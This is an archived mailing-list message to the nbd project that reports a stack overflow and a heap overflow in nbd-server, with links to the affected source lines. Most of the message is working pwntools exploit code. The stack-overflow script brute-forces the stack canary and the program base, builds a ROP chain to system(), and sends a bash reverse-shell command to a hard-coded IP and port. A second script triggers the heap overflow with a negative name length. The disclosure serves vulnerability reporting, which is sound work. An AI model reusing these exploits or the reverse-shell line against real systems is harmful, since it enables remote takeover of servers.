

---

[[Date Prev](msg00036.html)][[Date Next](msg00038.html)]
[[Thread Prev](msg00036.html)][[Thread Next](msg00038.html)]
[[Date Index](maillist.html#00037)]
[[Thread Index](threads.html#00037)]

# report security problem of nbd

---

* *To*: nbd@other.debian.org
* *Subject*: report security problem of nbd
* *From*: çŽ‹å¤š <duo.wang@chaitin.com>
* *Date*: Mon, 24 Jan 2022 12:10:06 +0800
* *Message-id*: <[[ðŸ”Ž]](/msgid-search/CAFfU0HAYyuiuvVDe622zP7OLXDYRftrYzvYjeRxgLaKoq2E0%2BA%40mail.gmail.com)Â [CAFfU0HAYyuiuvVDe622zP7OLXDYRftrYzvYjeRxgLaKoq2E0+A@mail.gmail.com](msg00037.html)>

---

1.stack overflowÂ In nbd-server.c, function handle\_info have a stack overflow
<https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2299>

len can be controlled by an attacker, the buf size is 1024, when `len - sizeof(namelen) > 1024` the buf overflow.
python poc code as following:from pwn import \*import timeimport sys
context.endian = "big"context.log\_level = "debug"
elf = ELF("./nbd-server")
NBD\_OPT = {Â  Â  "NBD\_OPT\_EXPORT\_NAME":1,Â  Â  "NBD\_OPT\_ABORT":2,Â  Â  "NBD\_OPT\_LIST":3,Â  Â  "NBD\_OPT\_STARTTLS":5,Â  Â  "NBD\_OPT\_INFO":6,Â  Â  "NBD\_OPT\_GO":7,Â  Â  "NBD\_OPT\_STRUCTURED\_REPLY":8,Â  Â  "NBD\_OPT\_LIST\_META\_CONTEXT":9,Â  Â  "NBD\_OPT\_SET\_META\_CONTEXT":10}
NBD\_NEW\_VERSION = b"IHAVEOPT"
def nbd\_opt\_info(buf, name):Â  Â  option = b""Â  Â  option += NBD\_NEW\_VERSIONÂ  Â  option += p32(NBD\_OPT["NBD\_OPT\_INFO"])Â  Â  option += p32(len(buf) + 4)Â  Â  option += p32(len(name))Â  Â  option += bufÂ  Â  option += nameÂ  Â  option += p16(0)Â  Â  p.send(option)
Â  Â  return
def nbd\_opt\_list():Â  Â  option = b""Â  Â  option += NBD\_NEW\_VERSIONÂ  Â  option += p32(NBD\_OPT["NBD\_OPT\_LIST"])Â  Â  option += p32(0)Â  Â  p.send(option)
Â  Â  return
def nbd\_opt\_structured\_reply():Â  Â  option = b""Â  Â  option += NBD\_NEW\_VERSIONÂ  Â  option += p32(NBD\_OPT["NBD\_OPT\_STRUCTURED\_REPLY"])Â  Â  option += p32(0)Â  Â  p.send(option)
Â  Â  return
def nbd\_opt\_set\_meta\_context(exportname, querystring):Â  Â  option = b""Â  Â  option += NBD\_NEW\_VERSIONÂ  Â  option += p32(NBD\_OPT["NBD\_OPT\_SET\_META\_CONTEXT"])Â  Â  option += p32(4 + len(exportname) + 4 + 4 + len(querystring))Â  Â  p.send(option)
Â  Â  msg = b""Â  Â  msg += p32(len(exportname)) # exportnamelenÂ  Â  msg += exportname.encode("latin") # exportnameÂ  Â  msg += p32(1) # nr\_queriesÂ  Â  msg += p32(len(querystring)) # querylenÂ  Â  msg += querystring.encode("latin") # querystringÂ  Â  p.send(msg)
Â  Â  return
def nbd\_opt\_list\_meta\_context(exportname, querystring):Â  Â  option = b""Â  Â  option += NBD\_NEW\_VERSIONÂ  Â  option += p32(NBD\_OPT["NBD\_OPT\_LIST\_META\_CONTEXT"])Â  Â  option += p32(4 + len(exportname) + 4 + 4 + len(querystring))Â  Â  p.send(option)Â  Â  Â  Â  msg = b""Â  Â  msg += p32(len(exportname)) # exportnamelenÂ  Â  msg += exportname.encode("latin") # exportnameÂ  Â  msg += p32(1) # nr\_queriesÂ  Â  msg += p32(len(querystring)) # querylenÂ  Â  msg += querystring.encode("latin") # querystringÂ  Â  p.send(msg)
Â  Â  return
def nbd\_opt\_go(exportname, info):Â  Â  option = b""Â  Â  option += NBD\_NEW\_VERSIONÂ  Â  option += p32(NBD\_OPT["NBD\_OPT\_GO"])Â  Â  option += p32(4 + len(exportname) + 2 + 2)Â  Â  p.send(option)Â  Â  Â  Â  msg = b""Â  Â  msg += p32(len(exportname)) # exportnamelenÂ  Â  msg += exportname.encode("latin") # exportnameÂ  Â  msg += p16(1) # nrinfosÂ  Â  msg += p16(info) # infoÂ  Â  p.send(msg)
Â  Â  return
t0 = time.perf\_counter()
if len(sys.argv) < 3:Â  Â  print("usage: nbdtest.py ip port")Â  Â  exit(0)
ip = sys.argv[1]port = int(sys.argv[2])p = remote(ip, port)
p.recvuntil(b"NBDMAGICIHAVEOPT")gflag = u16(p.recv())p.send(p32(gflag))
canary = b"\x00"for i in range(7):Â  Â  for j in range(256):Â  Â  Â  Â  payload = b""Â  Â  Â  Â  payload += b"A"\*1032Â  Â  Â  Â  payload += canaryÂ  Â  Â  Â  payload += p8(j)Â  Â  Â  Â  nbd\_opt\_info(payload, b"B"\*4096)Â  Â  Â  Â  p.recvuntil(b"Export unknown")
Â  Â  Â  Â  p.send(NBD\_NEW\_VERSION + p32(0xdeadbeef) + p32(0))Â  Â  Â  Â  try:Â  Â  Â  Â  Â  Â  p.recvuntil(b"The given option is unknown to this server implementation")Â  Â  Â  Â  except:Â  Â  Â  Â  Â  Â  p.close()
Â  Â  Â  Â  Â  Â  p = remote(ip, port)Â  Â  Â  Â  Â  Â  p.recvuntil(b"NBDMAGICIHAVEOPT")Â  Â  Â  Â  Â  Â  gflag = u16(p.recv())Â  Â  Â  Â  Â  Â  p.send(p32(gflag))Â  Â  Â  Â  Â  Â  continue
Â  Â  Â  Â  canary += p8(j)Â  Â  Â  Â  p.close()
Â  Â  Â  Â  p = remote(ip, port)Â  Â  Â  Â  p.recvuntil(b"NBDMAGICIHAVEOPT")Â  Â  Â  Â  gflag = u16(p.recv())Â  Â  Â  Â  p.send(p32(gflag))Â  Â  Â  Â  break
log.success("canary: "+ hex(u64(canary.ljust(8, b"\x00"), endian='little')))
progaddr = b"\x70"for i in range(5):Â  Â  for j in range(256):Â  Â  Â  Â  payload = b""Â  Â  Â  Â  payload += b"A"\*1032Â  Â  Â  Â  payload += canaryÂ  Â  Â  Â  payload += p64(0xdeadbeef, endian='little')\*7Â  Â  Â  Â  payload += progaddrÂ  Â  Â  Â  payload += p8(j)Â  Â  Â  Â  nbd\_opt\_info(payload, b"B"\*4096)Â  Â  Â  Â  p.recvuntil(b"Export unknown")
Â  Â  Â  Â  try:Â  Â  Â  Â  Â  Â  p.recvuntil(b"NBDMAGICIHAVEOPT")Â  Â  Â  Â  except:Â  Â  Â  Â  Â  Â  p.close()
Â  Â  Â  Â  Â  Â  p = remote(ip, port)Â  Â  Â  Â  Â  Â  p.recvuntil(b"NBDMAGICIHAVEOPT")Â  Â  Â  Â  Â  Â  gflag = u16(p.recv())Â  Â  Â  Â  Â  Â  p.send(p32(gflag))Â  Â  Â  Â  Â  Â  continue
Â  Â  Â  Â  progaddr += p8(j)Â  Â  Â  Â  p.close()
Â  Â  Â  Â  p = remote(ip, port)Â  Â  Â  Â  p.recvuntil(b"NBDMAGICIHAVEOPT")Â  Â  Â  Â  gflag = u16(p.recv())Â  Â  Â  Â  p.send(p32(gflag))Â  Â  Â  Â  break
proc\_base = u64(progaddr.ljust(8, b"\x00"), endian='little') - 0x9570log.success("proc\_base: "+ hex(proc\_base))
payload = b""payload += b"A"\*1032payload += canarypayload += p64(0xdeadbeef, endian='little')\*7payload += p64(proc\_base + 0xC2AA, endian='little')payload += p64(0, endian='little')payload += p64(1, endian='little')payload += p64(4, endian='little')payload += p64(proc\_base + 0x13400, endian='little')payload += p64(0x40, endian='little')payload += p64(proc\_base + elf.got['read'], endian='little')payload += p64(proc\_base + 0xC290, endian='little')payload += p64(0)\*7payload += p64(proc\_base + 0x4a58, endian='little')payload += p64(proc\_base + 0x13400, endian='little')payload += p64(proc\_base + elf.plt['system'] , endian='little')nbd\_opt\_info(payload, b"B"\*4096)
p.send(b"bash -c 'sh -i >& /dev/tcp/[192.168.228.133/23333](http://192.168.228.133/23333) 0>&1'")
print(time.perf\_counter() - t0)p.interactive()

2.heap overflowIn nbd-server.c, function handle\_info andÂ handle\_export\_name have a heapÂ overflow

<https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2302>
<https://github.com/NetworkBlockDevice/nbd/blob/5750003711b8050bad3ddaf5196201ef419ce15d/nbd-server.c#L2117>

namelen can be controlled by an attacker,Â  when `namelen = -1`,Â  malloc will allocate a very small buffer, but socket\_read will read a 0xffffffff, thus causing a heap overflow
from pwn import \*
context.endian = "big"context.log\_level = "debug"
elf = ELF("./nbd-server")
NBD\_OPT = {Â  Â  "NBD\_OPT\_EXPORT\_NAME":1,Â  Â  "NBD\_OPT\_ABORT":2,Â  Â  "NBD\_OPT\_LIST":3,Â  Â  "NBD\_OPT\_STARTTLS":5,Â  Â  "NBD\_OPT\_INFO":6,Â  Â  "NBD\_OPT\_GO":7,Â  Â  "NBD\_OPT\_STRUCTURED\_REPLY":8,Â  Â  "NBD\_OPT\_LIST\_META\_CONTEXT":9,Â  Â  "NBD\_OPT\_SET\_META\_CONTEXT":10}
NBD\_NEW\_VERSION = b"IHAVEOPT"
def nbd\_opt\_info(buf, name):Â  Â  option = b""Â  Â  option += NBD\_NEW\_VERSIONÂ  Â  option += p32(NBD\_OPT["NBD\_OPT\_INFO"])Â  Â  option += p32(len(buf) + 4)Â  Â  option += p32(len(name))Â  Â  option += bufÂ  Â  option += nameÂ  Â  option += p16(0)Â  Â  p.send(option)
Â  Â  return
if len(sys.argv) < 3:Â  Â  print("usage: nbdtest.py ip port")Â  Â  exit(0)
ip = sys.argv[1]port = int(sys.argv[2])p = remote(ip, port)
p.recvuntil(b"NBDMAGICIHAVEOPT")gflag = u16(p.recv())p.send(p32(gflag))
option = b""option += NBD\_NEW\_VERSIONoption += p32(NBD\_OPT["NBD\_OPT\_INFO"])option += p32(1024)option += p32(-1)option += b"A"\*1024option += b"B"\*4096option += p16(0)p.send(option)
Wangduo ofÂ Chaitin Security Research Lab

---

